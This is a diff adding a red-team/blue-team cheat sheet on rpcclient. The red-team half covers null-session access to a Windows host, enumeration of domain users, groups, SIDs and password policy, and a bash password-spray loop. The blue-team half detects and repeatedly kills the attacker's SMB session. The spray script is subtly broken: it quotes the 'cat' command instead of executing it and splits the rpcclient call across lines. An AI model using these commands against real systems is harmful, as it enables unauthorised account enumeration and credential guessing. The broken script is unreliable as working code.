@@ -1,0 +1,59 @@
+********* Red Team RPC into Box *************
+
+Syntax of rpcclient:
+rpcclient —U <username> <winipaddr>
+
+RPC null session allowed
+rpcclient -U "" -N 1.1.1.1
+
+Get the version of the target windows machine:
+rpcclient$> srvinfo
+
+enumerate domain users
+rpcclient$> enumdomusers
+
+enumerate domain groups
+rpcclient$> enumdomgroups
+
+windows treats some domain groups as aliases... use this command
+rpcclient$> enumalsgroups domain
+
+to get a full SID number for a user run lookupnames
+rpcclient$> lookupnames <username>
+
+query group information and group membership
+rpcclient$> querygroup <rid# from prev enum>
+rpcclient$> querygroupmem <rid# from prev enum>
+
+query specific user info by RID
+rpcclient$> queryuser <rid#>
+
+get pw policy info
+rpcclient$> getdompwinfo
+rpcclient$> getusrdompwinfo <rid#>
+
+Password spray attack
+#!/bin/bash
+for i in 'cat domain-users.txt'; do
+echo -n "[*] user: $i" &&
+rpcclient -U "$i%password"
+-c "getusername;quit" 1.1.1.1
+done
+
+
+########################### Blue Team for this exploit #########################
+
+to see if someone has used this on your box run the net sessions command
+C:\> net sessions
+Computer   User name  Client type  Opens   Idle Time
+-----------------------------------------------------
+\1.1.1.1    test      unix          6      00:02:53
+
+the command completed successfully.
+
+
+***** Now kick the red team member out of your box for good!!!!! *************
+C:\> net session \1.1.1.1 /del
+
+***** prevent red team from re gaining access ******* (credit for this firewall cli goes to Ed Skoudis)
+C:\> FOR /L %i in (1,0,2) do @net session \1.1.1.1 /del /y & ping -n 2 127.0.0.1>nul
